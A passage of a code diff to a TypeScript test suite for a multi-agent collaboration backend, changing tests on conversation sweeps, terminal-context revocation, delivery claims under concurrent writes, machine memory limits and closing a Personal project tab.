-    await expect(typed(peers, 'unrevoked')).rejects.toMatchObject({ code: 'NATIVE_CONTEXT_REVOKED' })
-    expect((await db.superTabNativeContext.findUniqueOrThrow({ where: { id: hosts } })).revoked).toBe(false)
-    await expect(typed(hosts, 'owner')).resolves.toMatchObject({ eventId: expect.any(String) })
-    await expect(opened(host)).resolves.toMatchObject({ contextId: expect.any(String) })
-  })
 
   it('lets every reader watch it while it is the Lead, view only: not through an ordinary share, and not once it is no longer the Lead', async () => {
     const { tab, lead, harnessId, swarmShare, ordinaryShare } = await privateChat()
@@ -4431,30 +3815,6 @@ describe('the PM\'s terminal after a private chat (final review, Critical 1)', (
   })
 })
 
-// Prod, 2026-10-28 (Atlas, the hour to 14:30 VN): every command, message.send included, sent one terminal-context query of
-// 78 branches, 70 of them this project's archived groups, that returned nothing and spent 67% of its 0.6–3.8 s planning.
-describe('terminal-context revoke on an ordinary command', () => {
-  it('sends a message in a Swarm with many archived groups and a private project without touching terminal contexts', async () => {
-    const { tab } = await fixture()
-    await invite(tab)
-    await run(tab, { type: 'project.create', name: 'Owner only', visibility: 'private', brief: '' })
-    for (let i = 0; i < 30; i++) {
-      const group = String((await run(tab, { type: 'conversation.create', title: `Old ${i}`, brief: '', checks: [] })).result.conversationId)
-      await run(tab, { type: 'conversation.archive', conversationId: group, archived: true })
-    }
-    await db.$runCommandRaw({ profile: 2 })
-    try {
-      await run(tab, message('Status?'))
-    } finally {
-      await db.$runCommandRaw({ profile: 0 })
-    }
-    const profiled = await db.$runCommandRaw({ find: 'system.profile', filter: { 'command.profile': { $exists: false } }, batchSize: 10000 }) as
-      unknown as { cursor: { firstBatch: Array<{ ns: string; op: string }> } }
-    await db.$runCommandRaw({ drop: 'system.profile' })
-    expect(profiled.cursor.firstBatch.filter(row => row.ns.endsWith('.SuperTabNativeContext'))).toEqual([])
-  })
-})
-
 describe('Swarm sweeps', () => {
   const day = 86_400_000
   async function finishedGroup(tab: string, lead: string) {
@@ -4462,27 +3822,16 @@ describe('Swarm sweeps', () => {
       checks: [{ description: 'Done', independent: false }] })).result.conversationId)
     const worker = String((await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: randomUUID(),
       name: 'Worker', configuration: config, lead: false })).result.agentId)
-    const assignmentId = String((await run(tab, { type: 'work.assign', conversationId: group, agentId: worker })).result.assignmentId)
-    const checkId = (await store.read(owner, tab)).state.conversations.find(c => c.id === group)!.checks[0]!.id
-    await run(tab, { type: 'work.check', conversationId: group, assignmentId, checkId, passed: true, evidence: 'Shown' }, host, lead)
-    await run(tab, { type: 'work.status', conversationId: group, assignmentId, status: 'done', result: 'Shipped' }, host, worker)
+    await storeAssignment(db, tab, group, worker)
+    await storeStatus(db, tab, group, 'done', 'Shipped')
     return group
   }
 
-  /** The project's Lead reports through everything its workgroup said so far. */
-  async function acknowledge(tab: string, lead: string, group: string) {
-    const read = (await store.read(owner, tab)).state.conversations.find(c => c.id === group)!
-    await run(tab, { type: 'project.report', projectId: 'lead', through: { [group]: read.lastMessageSequence }, text: null }, host, lead)
-  }
-
-  it('puts a conversation archived by hand to sleep once its reports are acknowledged, and ordinary loads stop reading it', async () => {
+  it('puts a conversation archived by hand to sleep at once, with no report to wait for, and ordinary loads stop reading it (#3593)', async () => {
     const { tab, lead } = await fixture()
     const group = await finishedGroup(tab, lead)
     await run(tab, { type: 'conversation.archive', conversationId: group, archived: true })
     const loaded = async () => (await db.$transaction(tx => parts.loadActive(tx, tab))).groups.map(p => p.key)
-    expect(await loaded()).toContain(group)
-    await acknowledge(tab, lead, group)
-    await sweepSwarms(db)
     expect(await loaded()).not.toContain(group)
     expect((await db.$transaction(tx => parts.loadDormant(tx, tab, {}))).map(p => p.key)).toEqual([group])
     // Reopened, it is active again.
@@ -4496,17 +3845,14 @@ describe('Swarm sweeps', () => {
     const listed = async () => (await store.read(owner, tab)).state.conversations.map(c => c.id)
     await sweepSwarms(db, Date.now() + day - 60_000)
     expect(await listed()).toContain(group)
-    // Its reports are not acknowledged yet: it stays awake, where the Lead's report check sees it.
-    await sweepSwarms(db, Date.now() + day + 60_000)
-    expect(await listed()).toContain(group)
-    await acknowledge(tab, lead, group)
+    // No report is waited for (task #3593): after the quiet day it sleeps.
     await sweepSwarms(db, Date.now() + day + 60_000)
     expect(await listed()).not.toContain(group)
     // The Lead conversation stays awake whatever its age.
     expect(await listed()).toContain('lead')
     expect((await db.$transaction(tx => parts.loadDormant(tx, tab, {}))).map(p => p.key)).toEqual([group])
-    expect((await store.messages(owner, tab, group, {})).messages.at(-1)!.text).toMatch(/^Done/)
-    await run(tab, { type: 'message.send', conversationId: group, text: 'One more thing.', replyTo: null, recipientIds: [] })
+    // The Lead's post: only agents post in a task's chat (agentsOnly.test.ts).
+    await run(tab, { type: 'message.send', conversationId: group, text: 'One more thing.', replyTo: null, recipientIds: [] }, host, lead)
     expect(await listed()).toContain(group)
     expect(await db.$transaction(tx => parts.loadDormant(tx, tab, {}))).toEqual([])
   })
@@ -4520,79 +3866,11 @@ describe('Swarm sweeps', () => {
       // Keys that sort before any generated id, so they come first in the store's natural order as well as by age.
       const key = `-idle-${String(i).padStart(3, '0')}`
       return { id: `${tab}:${key}`, tabId: tab, key, version: 1, changedAt: old, deleted: false, ordinal: 1000 + i, projectId: 'lead', kind: null,
-        archived: false, dormant: false, agentIds: [], executionMachineId: null, messageSeq: 0, reportSeq: 0, lastActivityAt: old,
+        archived: false, dormant: false, agentIds: [], executionMachineId: null, messageSeq: 0, lastActivityAt: old,
         data: { id: key, projectId: 'lead', title: key, leadId: null, agentIds: [], archived: false, brief: '', checks: [], assignment: null, lastMessageSequence: 0 } }
     }) })
-    await acknowledge(tab, lead, group)
     await sweepSwarms(db, Date.now() + day + 60_000)
     expect((await db.$transaction(tx => parts.loadDormant(tx, tab, {}))).map(p => p.key)).toContain(group)
-  })
-
-  it('revokes a terminal in a dormant conversation when its opener loses the project, and restoring access does not revive it', async () => {
-    const { tab } = await fixture()
-    await invite(tab)
-    const projectId = String((await run(tab, { type: 'project.create', name: 'Secret', visibility: 'private', brief: '' })).result.projectId)
-    await run(tab, { type: 'project.sharing', projectId, visibility: 'private', memberIds: [peer.sub] })
-    const leadChat = (await store.read(owner, tab)).state.projects!.find(p => p.id === projectId)!.leadConversationId
-    const projectLead = String((await run(tab, { type: 'agent.add', conversationId: leadChat, machineId: 'test-host', harnessId: randomUUID(),
-      name: 'Secret Lead', configuration: config, lead: true })).result.agentId)
-    const group = String((await run(tab, { type: 'conversation.create', projectId, title: 'Quiet', brief: 'Old work',
-      checks: [{ description: 'Done', independent: false }] })).result.conversationId)
-    const worker = String((await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: randomUUID(),
-      name: 'Secret Worker', configuration: config, lead: false })).result.agentId)
-    const { contextId } = await store.native.open(peer, tab, { operationId: randomUUID(), conversationId: group, agentId: worker })
-    const turn = await gapToCoordinator(tab, group, worker, contextId)
-    const waiting = await db.superTabDelivery.findFirstOrThrow({ where: { tabId: tab, messageId: turn.eventId, agentId: projectLead } })
-    // Its work finished, its reports acknowledged, a quiet day later it sleeps: no ordinary load reads it any more. Not
-    // archived: archiving revokes its terminals by itself.
-    const assignmentId = (await storedState(tab)).conversations.find(c => c.id === group)!.assignment!.id
-    const checkId = (await storedState(tab)).conversations.find(c => c.id === group)!.checks[0]!.id
-    await run(tab, { type: 'work.check', conversationId: group, assignmentId, checkId, passed: true, evidence: 'Shown' })
-    await run(tab, { type: 'work.status', conversationId: group, assignmentId, status: 'done', result: 'Shipped' }, host, worker)
-    const read = (await storedState(tab)).conversations.find(c => c.id === group)!
-    await run(tab, { type: 'project.report', projectId, through: { [group]: read.lastMessageSequence }, text: null }, host, projectLead)
-    await sweepSwarms(db, Date.now() + day + 60_000)
-    expect((await db.$transaction(tx => parts.loadDormant(tx, tab, {}))).map(p => p.key)).toContain(group)
-    expect((await db.superTabNativeContext.findUniqueOrThrow({ where: { id: contextId } })).revoked).toBe(false)
-
-    await run(tab, { type: 'project.sharing', projectId, visibility: 'private', memberIds: [] })
-    expect((await db.superTabNativeContext.findUniqueOrThrow({ where: { id: contextId } })).revoked).toBe(true)
-    expect((await db.superTabDelivery.findUniqueOrThrow({ where: { id: waiting.id } })).status).toBe('cancelled')
-    await run(tab, { type: 'project.sharing', projectId, visibility: 'private', memberIds: [peer.sub] })
-    await expect(store.native.append(host, tab, contextId, { turnId: 'late', kind: 'prompt', previousEventId: turn.eventId, text: 'After removal',
-      truncated: false, interrupted: false })).rejects.toMatchObject({ code: 'NATIVE_CONTEXT_REVOKED' })
-  })
-
-  it('revokes a terminal in a dormant legacy conversation of the default project, stored with no project, when its opener loses the project', async () => {
-    const { tab, lead } = await fixture()
-    await invite(tab)
-    await run(tab, { type: 'project.sharing', projectId: 'lead', visibility: 'private', memberIds: [peer.sub] })
-    const group = String((await run(tab, { type: 'conversation.create', title: 'Legacy quiet', brief: 'Old work',
-      checks: [{ description: 'Done', independent: false }] })).result.conversationId)
-    const worker = String((await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: randomUUID(),
-      name: 'Legacy Worker', configuration: config, lead: false })).result.agentId)
-    const { contextId } = await store.native.open(peer, tab, { operationId: randomUUID(), conversationId: group, agentId: worker })
-    const turn = await gapToCoordinator(tab, group, worker, contextId)
-    const waiting = await db.superTabDelivery.findFirstOrThrow({ where: { tabId: tab, messageId: turn.eventId, agentId: lead } })
-    const assignmentId = (await storedState(tab)).conversations.find(c => c.id === group)!.assignment!.id
-    const checkId = (await storedState(tab)).conversations.find(c => c.id === group)!.checks[0]!.id
-    await run(tab, { type: 'work.check', conversationId: group, assignmentId, checkId, passed: true, evidence: 'Shown' })
-    await run(tab, { type: 'work.status', conversationId: group, assignmentId, status: 'done', result: 'Shipped' }, host, worker)
-    await acknowledge(tab, lead, group)
-    await sweepSwarms(db, Date.now() + day + 60_000)
-    // Stored as a Swarm from before projects left it: no project on the group, which then belongs to the default one.
-    const row = await db.swarmGroup.findFirstOrThrow({ where: { tabId: tab, key: group } })
-    const { projectId: _projectId, ...legacy } = row.data as Record<string, unknown>
-    await db.swarmGroup.update({ where: { id: row.id }, data: { projectId: null, data: legacy as never } })
-    expect((await db.$transaction(tx => parts.loadDormant(tx, tab, {}))).map(p => p.key)).toContain(group)
-    expect((await db.superTabNativeContext.findUniqueOrThrow({ where: { id: contextId } })).revoked).toBe(false)
-
-    await run(tab, { type: 'project.sharing', projectId: 'lead', visibility: 'private', memberIds: [] })
-    expect((await db.superTabNativeContext.findUniqueOrThrow({ where: { id: contextId } })).revoked).toBe(true)
-    expect((await db.superTabDelivery.findUniqueOrThrow({ where: { id: waiting.id } })).status).toBe('cancelled')
-    await run(tab, { type: 'project.sharing', projectId: 'lead', visibility: 'private', memberIds: [peer.sub] })
-    await expect(store.native.append(host, tab, contextId, { turnId: 'late', kind: 'prompt', previousEventId: turn.eventId, text: 'After removal',
-      truncated: false, interrupted: false })).rejects.toMatchObject({ code: 'NATIVE_CONTEXT_REVOKED' })
   })
 
   it('never lets a person, agent or machine come back at a lower version, even long after it was removed', async () => {
@@ -4605,14 +3883,12 @@ describe('Swarm sweeps', () => {
       const previous = (await storedState(tab)).agents.find(a => a.id === agentId)!.configurationVersion ?? null
       await run(tab, { type: 'agent.configuration', previousVersion: previous, configuration: { ...config, effort } }, host, agentId)
     }
-    const before = await db.swarmAgent.findFirstOrThrow({ where: { tabId: tab, key: agentId } })
     await run(tab, { type: 'agent.remove', agentId })
-    // Past the tombstone's 7 days: its record stays, compacted, and holds the version; nothing purges it.
+    const tombstone = await db.swarmAgent.findFirstOrThrow({ where: { tabId: tab, key: agentId } })
+    expect(tombstone.deleted).toBe(true)
+    // Past the tombstone's 7 days it goes (agentTombstones.ts); the Swarm's agent floor keeps its version.
     await sweepSwarms(db, Date.now() + 8 * day)
-    const kept = await db.swarmAgent.findFirstOrThrow({ where: { tabId: tab, key: agentId } })
-    expect(kept.deleted).toBe(true)
-    expect(kept.data).toEqual({})
-    expect(kept.version).toBeGreaterThan(before.version)
+    expect(await db.swarmAgent.findFirst({ where: { tabId: tab, key: agentId } })).toBeNull()
     await ensurePartExpiry(db)
     for (const collection of ['SwarmMember', 'SwarmAgent', 'SwarmMachine']) {
       const indexes = await db.$runCommandRaw({ listIndexes: collection }) as { cursor: { firstBatch: Array<{ expireAfterSeconds?: number }> } }
@@ -4621,14 +3897,15 @@ describe('Swarm sweeps', () => {
     await add()
     const back = await db.swarmAgent.findFirstOrThrow({ where: { tabId: tab, key: agentId } })
     expect(back.deleted).toBe(false)
-    expect(back.version).toBeGreaterThan(kept.version)
+    // Above the tombstone a Desktop open all along last saw.
+    expect(back.version).toBeGreaterThan(tombstone.version)
     const history = await db.superTabConfiguration.findMany({ where: { tabId: tab, agentId }, orderBy: { revision: 'asc' } })
     expect(history.at(-1)!.configuration).toMatchObject({ effort: 'high' })
   })
 
   it('drops finished starts and expired invitations after their time, and creates the purge index', async () => {
     const { tab, lead } = await fixture()
-    const { startId } = await routedStart(tab, lead)
+    const { startId } = await startBuilder(tab, lead)
     await store.execute(host, tab, { operationId: randomUUID(), command: { type: 'agent.startFailed', startId, error: 'No room.' } }, lead)
     await run(tab, { type: 'invite.create', email: 'late@example.com', role: 'viewer', conversationId: 'lead' })
     await sweepSwarms(db, Date.now() + 6 * day)
@@ -4653,18 +3930,20 @@ describe('Swarm parts under concurrent writes', () => {
     } })
     return { store: new SuperTabStore(proxy as PrismaClient), get attempts() { return attempts } }
   }
-  /** A group with its own assigned worker, so the worker's posts reach the Lead. */
+  /** A group with its own assigned worker, so the worker's posts reach the Lead. One at a time: the assignment is written
+   *  over the Swarm's parts (storeAssignment). */
   async function workGroup(tab: string, title: string) {
     const group = String((await run(tab, { type: 'conversation.create', title, brief: 'Build it', checks: [{ description: 'Built', independent: false }] })).result.conversationId)
     const worker = String((await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: randomUUID(),
       name: title, configuration: config, lead: false })).result.agentId)
-    await run(tab, { type: 'work.assign', conversationId: group, agentId: worker })
+    await storeAssignment(db, tab, group, worker)
     return { group, worker }
   }
 
   it('lets agents post in different groups at the same time without a single conflict', async () => {
     const { tab } = await fixture()
-    const groups = await Promise.all(['Parser', 'Renderer', 'Exporter', 'Importer'].map(title => workGroup(tab, title)))
+    const groups: Array<{ group: string; worker: string }> = []
+    for (const title of ['Parser', 'Renderer', 'Exporter', 'Importer']) groups.push(await workGroup(tab, title))
     // The project is dirty already, as it is in a busy Swarm: posts do not write its progress again.
     for (const { group, worker } of groups) await run(tab, { type: 'message.send', conversationId: group, text: 'Started.', replyTo: null, recipientIds: [] }, host, worker)
     const c = counted()
@@ -4681,42 +3960,29 @@ describe('Swarm parts under concurrent writes', () => {
     }
   })
 
-  it('records terminal turns in different groups at the same time without a single conflict, even when one person opened them all', async () => {
+  // An agent of four tasks stands in for the coordinator: agents' posts to the coordinator wait for its digest (#3387),
+  // which no host claims.
+  it('lets an agent\'s host claim its deliveries while it posts, without a conflict between them', async () => {
     const { tab } = await fixture()
-    const groups = await Promise.all(['Alpha', 'Beta', 'Gamma'].map(title => workGroup(tab, title)))
-    const contexts = []
-    for (const { group, worker } of groups) contexts.push((await store.native.open(owner, tab, { operationId: randomUUID(), conversationId: group, agentId: worker })).contextId)
-    // The project is dirty already: a turn writes only its own group.
-    for (const contextId of contexts) await store.native.append(host, tab, contextId, { turnId: 'warm', kind: 'prompt', previousEventId: null, text: 'Warm up', truncated: false, interrupted: false })
-    const c = counted()
-    await Promise.all(contexts.map(async contextId => {
-      let previous = (await db.superTabNativeContext.findUniqueOrThrow({ where: { id: contextId } })).lastEventId
-      for (let i = 0; i < 4; i++) {
-        const recorded = await c.store.native.append(host, tab, contextId, { turnId: `turn_${i}`, kind: 'prompt', previousEventId: previous,
-          text: `Prompt ${i}`, truncated: false, interrupted: false }) as { eventId: string }
-        previous = recorded.eventId
-      }
-    }))
-    expect(c.attempts).toBe(contexts.length * 4)
-  })
-
-  it('lets a Lead\'s host claim its deliveries while the Lead posts, without a conflict between them', async () => {
-    const { tab, lead } = await fixture()
-    const groups = await Promise.all(['North', 'South', 'East'].map(title => workGroup(tab, title)))
+    const { group: own, worker: hub } = await workGroup(tab, 'Hub')
+    const groups: Array<{ group: string; worker: string }> = []
+    for (const title of ['North', 'South', 'East']) groups.push(await workGroup(tab, title))
     for (const { group, worker } of groups) {
-      for (let i = 0; i < 2; i++) await run(tab, { type: 'message.send', conversationId: group, text: `Report ${i}`, replyTo: null, recipientIds: [] }, host, worker)
+      await run(tab, { type: 'conversation.agent', conversationId: group, agentId: hub, present: true, lead: false })
+      for (let i = 0; i < 2; i++) await run(tab, { type: 'message.send', conversationId: group, text: `Report ${i}`, replyTo: null, recipientIds: [hub] }, host, worker)
     }
-    const waiting = await store.deliveries(host, tab, lead)
+    const waiting = await store.deliveries(host, tab, hub)
     expect(waiting.length).toBeGreaterThanOrEqual(6)
     const c = counted()
     await Promise.all([
-      ...waiting.map(d => c.store.delivery(host, tab, lead, d.id, { type: 'claim', claimId: randomUUID() })),
-      c.store.execute(host, tab, { operationId: randomUUID(), command: { type: 'message.send', conversationId: 'lead', text: 'Planning.', replyTo: null, recipientIds: [] } }, lead),
+      ...waiting.map(d => c.store.delivery(host, tab, hub, d.id, { type: 'claim', claimId: randomUUID() })),
+      c.store.execute(host, tab, { operationId: randomUUID(), command: { type: 'message.send', conversationId: own, text: 'Planning.', replyTo: null, recipientIds: [] } }, hub),
     ])
     expect(c.attempts).toBe(waiting.length + 1)
   })
 
-  it('gives a machine\'s last slot to exactly one of two concurrent starts', async () => {
+  // Its last room is memory since saved counts went (2026-11-10): 28 GB free holds one 15 GiB start, not two.
+  it('gives a machine\'s last room to exactly one of two concurrent starts', async () => {
     const tab = (await store.create(owner, randomUUID(), 'Slots')).id
     await run(tab, { type: 'invite.create', email: host.email, role: 'collaborator', conversationId: 'lead' })
       .then(r => run(tab, { type: 'invite.accept', inviteId: r.result.inviteId as string }, host))
@@ -4725,46 +3991,38 @@ describe('Swarm parts under concurrent writes', () => {
     await store.observeMachine(host, tab, 'test-host', { generation, resources: { cpuPercent: 10, memoryTotalBytes: 32e9, memoryUsedBytes: 4e9,
       diskFreeBytes: 120e9, diskTotalBytes: 500e9, projectDiskFreeBytes: 120e9, deviceType: 'Laptop', chip: 'Fixture', os: 'macOS', gpuPercent: null },
       quotas: [], tools: {}, runningHarnessIds: [], stoppedHarnessIds: [] })
-    const request = (name: string) => ({ conversationId: 'lead', machineId: 'test-host', engine: 'codex', name, cwd: '/fixture/repo', worktree: false,
-      requirements: { memoryBytes: 0, diskBytes: 0, maxCpuPercent: 100, tools: [], devices: [], quotaRequired: false } })
+    // Started in a task: the project chat holds only its coordinator among agents (#2207).
+    const group = String((await run(tab, { type: 'conversation.create', title: 'Slots work', brief: '', checks: [] })).result.conversationId)
+    const request = (name: string) => ({ conversationId: group, machineId: 'test-host', engine: 'codex', name, cwd: '/fixture/repo', worktree: false,
+      requirements: { memoryBytes: 15 * 1024 ** 3, diskBytes: 0, maxCpuPercent: 100, tools: [], devices: [], quotaRequired: false } })
     const results = await Promise.allSettled([run(tab, { type: 'agent.start', request: request('One') }, host),
       run(tab, { type: 'agent.start', request: request('Two') }, host)])
     expect(results.filter(r => r.status === 'fulfilled')).toHaveLength(1)
-    expect(results.find(r => r.status === 'rejected')).toMatchObject({ reason: { code: 'MACHINE_FULL' } })
-  })
-
-  it('never keeps a message from a person removed while it was being sent', async () => {
-    const { tab, lead } = await fixture()
-    await invite(tab)
-    const results = await Promise.allSettled([run(tab, message('Sent while leaving.'), peer), run(tab, { type: 'member.remove', userId: peer.sub })])
-    expect(results[1]!.status).toBe('fulfilled')
-    // Sent first, its delivery was revoked with the membership; sent second, it was refused. Either way nothing waits.
-    expect(await store.deliveries(host, tab, lead)).toEqual([])
-    const authored = await db.superTabDelivery.findMany({ where: { tabId: tab, authorId: peer.sub } })
-    expect(authored.every(d => d.status === 'cancelled')).toBe(true)
+    expect(results.find(r => r.status === 'rejected')).toMatchObject({ reason: { code: 'MACHINE_FULL', details: { reason: 'memory' } } })
   })
 
   it('serializes a claim against revoking an agent sender', async () => {
-    const { tab, lead } = await fixture()
+    const { tab } = await fixture()
     const { group, worker } = await workGroup(tab, 'Revoked')
-    await run(tab, { type: 'message.send', conversationId: group, text: 'Report for the Lead.', replyTo: null, recipientIds: [] }, host, worker)
-    const delivery = (await store.deliveries(host, tab, lead)).find(d => d.authorId === worker)!
-    await run(tab, { type: 'work.cancel', conversationId: group, assignmentId: (await store.read(owner, tab)).state.conversations.find(c => c.id === group)!.assignment!.id,
-      reason: 'Withdrawing the worker' })
+    // Another agent of the task hears it: an agent's post to the coordinator waits for its digest (#3387), which no host claims.
+    const reader = String((await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: randomUUID(),
+      name: 'Reader', configuration: config, lead: false })).result.agentId)
+    await run(tab, { type: 'message.send', conversationId: group, text: 'Report for the reader.', replyTo: null, recipientIds: [reader] }, host, worker)
+    const delivery = (await store.deliveries(host, tab, reader)).find(d => d.authorId === worker)!
+    await storeStatus(db, tab, group, 'cancelled')
     const results = await Promise.allSettled([
-      store.delivery(host, tab, lead, delivery.id, { type: 'claim', claimId: randomUUID() }),
+      store.delivery(host, tab, reader, delivery.id, { type: 'claim', claimId: randomUUID() }),
       run(tab, { type: 'agent.remove', agentId: worker }),
     ])
     expect(results[1]!.status).toBe('fulfilled')
     expect((await db.superTabDelivery.findUniqueOrThrow({ where: { id: delivery.id } })).status).toBe('cancelled')
-    expect((await store.deliveries(host, tab, lead)).map(d => d.id)).not.toContain(delivery.id)
+    expect((await store.deliveries(host, tab, reader)).map(d => d.id)).not.toContain(delivery.id)
   })
 
   it('serializes a claim against removing its receiving agent', async () => {
     const { tab, lead } = await fixture()
     const { group, worker } = await workGroup(tab, 'Receiver')
-    await run(tab, { type: 'work.cancel', conversationId: group, assignmentId: (await store.read(owner, tab)).state.conversations.find(c => c.id === group)!.assignment!.id,
-      reason: 'Withdrawing the worker' })
+    await storeStatus(db, tab, group, 'cancelled')
     await run(tab, { type: 'message.send', conversationId: group, text: 'For the worker.', replyTo: null, recipientIds: [worker] }, host, lead)
     const delivery = (await store.deliveries(host, tab, worker))[0]!
     const results = await Promise.allSettled([
@@ -4778,8 +4036,7 @@ describe('Swarm parts under concurrent writes', () => {
   it('ends the waiting delivery rows of a conversation archived or left by their receiver, so a claim in flight conflicts', async () => {
     const { tab, lead } = await fixture()
     const { group, worker } = await workGroup(tab, 'Rows')
-    const assignmentId = (await store.read(owner, tab)).state.conversations.find(c => c.id === group)!.assignment!.id
-    await run(tab, { type: 'work.cancel', conversationId: group, assignmentId, reason: 'Done here' })
+    await storeStatus(db, tab, group, 'cancelled')
     const waiting = await run(tab, { type: 'message.send', conversationId: group, text: 'Still waiting.', replyTo: null, recipientIds: [worker] }, host, lead)
     const row = async () => db.superTabDelivery.findFirstOrThrow({ where: { tabId: tab, agentId: worker, messageId: waiting.result.messageId as string } })
     const before = await row()
@@ -4789,7 +4046,10 @@ describe('Swarm parts under concurrent writes', () => {
     expect(left.updatedAt.getTime()).toBeGreaterThan(before.updatedAt.getTime())
     // Its receiver can no longer read it there: it ends now, rather than waiting unseen for good (prod watch, 2026-10-28).
     expect(left.status).toBe('cancelled')
-    const kept = await run(tab, { type: 'message.send', conversationId: group, text: 'For the Lead.', replyTo: null, recipientIds: [] })
+    // Another agent of the task names the Lead: only agents post in a task's chat (agentsOnly.test.ts).
+    const helper = (await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: randomUUID(), name: 'Helper',
+      configuration: config, lead: false })).result.agentId as string
+    const kept = await run(tab, { type: 'message.send', conversationId: group, text: 'For the Lead.', replyTo: null, recipientIds: [lead] }, host, helper)
     const toLead = async () => db.superTabDelivery.findFirstOrThrow({ where: { tabId: tab, messageId: kept.result.messageId as string } })
     const open = await toLead()
     await new Promise(resolve => setTimeout(resolve, 5))
@@ -4799,63 +4059,61 @@ describe('Swarm parts under concurrent writes', () => {
     // Archiving ends them too: 6 of 9 deliveries stuck for days in prod were in archived groups.
     expect(archived.status).toBe('cancelled')
   })
+})
 
-  it('assigns the routed agent through its finished start, without an override reason', async () => {
-    const { tab, lead } = await fixture()
-    const { routeDecisionId, startId } = await routedStart(tab, lead)
-    await store.execute(host, tab, { operationId: randomUUID(), command: { type: 'agent.startDispatch', startId } }, lead)
-    const agentId = String((await store.execute(host, tab, { operationId: randomUUID(), command: { type: 'agent.started', startId,
-      harnessId: randomUUID(), configuration: config } }, lead)).result.agentId)
-    // Started and not pooled: the start is finished and out of every command's active state.
-    expect((await db.swarmStart.findFirstOrThrow({ where: { tabId: tab, key: startId } })).finishedAt).not.toBeNull()
-    await run(tab, { type: 'work.define', conversationId: 'lead', brief: 'Routed work', checks: [{ description: 'Done', independent: false }] }, host, lead)
-    const assigned = await run(tab, { type: 'work.assign', conversationId: 'lead', agentId, routeDecisionId }, host, lead)
-    expect(assigned.result.assignmentId).toBeTruthy()
-    expect((await store.routeDecision(owner, tab, routeDecisionId)).final).toMatchObject({ kind: 'new', startId })
+// Task #3929 (for Diego's #3903): a closed tab's Personal project is deleted only if it has no message at that moment, in the same
+// write; a message that lands meanwhile makes it archived instead. Desktop sends it under one operation id from every computer.
+describe('a closed tab\'s Personal project', () => {
+  const person: AuthUser = { sub: '100000000000000000000391', email: 'tabs-3929@example.com', autonomousEnv: 'prod', role: 'user' }
+  const personal = async (visibility: 'private' | 'public' = 'private') => {
+    await db.user.upsert({ where: { id: person.sub }, create: { id: person.sub, externalId: `fixture-${person.sub}`, email: person.email,
+      autonomousEnv: person.autonomousEnv }, update: {} })
+    const tab = (await store.create(person, 'personal-swarm', 'Personal', 'private')).id
+    const tabOperation = `personal-tab-${randomUUID()}`
+    const projectId = String((await run(tab, { type: 'project.create', name: 'Untitled tab', visibility, brief: '' }, person, undefined,
+      tabOperation)).result.projectId)
+    const chat = (await store.read(person, tab)).state.projects!.find(p => p.id === projectId)!.leadConversationId
+    return { tab, projectId, chat, tabOperation }
+  }
+
+  it('archives it when a message lands while it is being closed', async () => {
+    const { tab, projectId, chat, tabOperation } = await personal()
+    let sent = false
+    const raced = new SuperTabStore(beforeFirstWrite(db, async () => {
+      if (sent) return
+      sent = true
+      // A person's post in a Personal project's channel, on a clock inside the channel exemptions (commands.ts CHANNEL_EXEMPTIONS_END).
+      await new SuperTabStore(db, exemptClock()).execute(person, tab, { operationId: randomUUID(),
+        command: { type: 'message.send', conversationId: chat, text: 'Written as the tab closed', replyTo: null, recipientIds: [] } })
+    }))
+    const closed = await raced.execute(person, tab, { operationId: randomUUID(), command: { type: 'project.closeTab', projectId, tabOperation } as Command })
+    expect(sent).toBe(true)
+    expect(closed.result).toMatchObject({ outcome: 'archived' })
+    expect((await store.read(person, tab)).state.projects!.find(p => p.id === projectId)).toMatchObject({ archived: true })
+  })
+
+  it('does its work once under one operation id, from any of the person\'s computers', async () => {
+    const { tab, projectId, tabOperation } = await personal()
+    const operationId = `close-tab-${randomUUID()}`
+    const first = await store.execute(person, tab, { operationId, command: { type: 'project.closeTab', projectId, tabOperation } as Command })
+    const again = await store.execute(person, tab, { operationId, command: { type: 'project.closeTab', projectId, tabOperation } as Command })
+    expect(first.result).toMatchObject({ outcome: 'deleted' })
+    expect(again.result).toEqual(first.result)
+    expect((await store.read(person, tab)).state.projects!.some(p => p.id === projectId)).toBe(false)
   })
 })
 
-describe('a migrated Swarm\'s kept old state (Stability 2.1)', () => {
-  /** About the 1 MB a production Swarm kept from before its split into parts (design 6.1: `SuperTab.legacyState`). */
-  const OLD_STATE = { conversations: Array.from({ length: 2_000 }, (_, i) => ({ id: `old-${i}`, title: 'x'.repeat(480) })) }
-  /** Far below the old state: a read that fetched it would send at least 1 MB. */
-  const READ_LIMIT = 200_000
-  const bytesOut = async () => Number(((await db.$runCommandRaw({ serverStatus: 1 })) as { network: { bytesOut: unknown } }).network.bytesOut)
-
-  it('is never fetched by a command, a read, the owner\'s lists, an invitation list or a host\'s terminal pickup', async () => {
-    const { tab, lead } = await fixture()
-    const invited: AuthUser = { sub: '100000000000000000000009', email: 'invited@example.com', autonomousEnv: 'prod', role: 'user' }
-    await run(tab, { type: 'invite.create', email: invited.email, role: 'viewer', conversationId: 'lead' })
-    const group = (await run(tab, { type: 'conversation.create', title: 'Terminal', brief: 'Answer the prompt', checks: [] })).result.conversationId as string
-    const worker = (await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: randomUUID(),
-      name: 'Terminal Engineer', configuration: config, lead: false })).result.agentId as string
-    await db.superTab.update({ where: { id: tab }, data: { legacyState: OLD_STATE } })
-
-    const fetched: string[] = []
-    /** Runs `body`, and names it when MongoDB sent this backend enough for the old state while it ran (bench/probe.ts). */
-    async function measured<T>(name: string, body: () => Promise<T>): Promise<T> {
-      const before = await bytesOut(), ownReply = await bytesOut() - before
-      const start = await bytesOut()
-      const result = await body()
-      if (await bytesOut() - start - ownReply >= READ_LIMIT) fetched.push(name)
-      return result
-    }
-    expect((await measured('command', () => run(tab, message('After the split')))).result.messageId).toBeTruthy()
-    expect((await measured('read', () => store.read(owner, tab))).state.agents.map(a => a.id).sort()).toEqual([lead, worker].sort())
-    expect(await measured('invitations', () => store.invitations(invited))).toEqual([expect.objectContaining({ tabId: tab, name: 'Pilot', role: 'viewer' })])
-    // The owner's lists read each of the owner's Swarms: an owner of this one alone, as the shared owner has many here.
-    const solo: AuthUser = { sub: '10000000000000000000000a', email: 'solo@example.com', autonomousEnv: 'prod', role: 'user' }
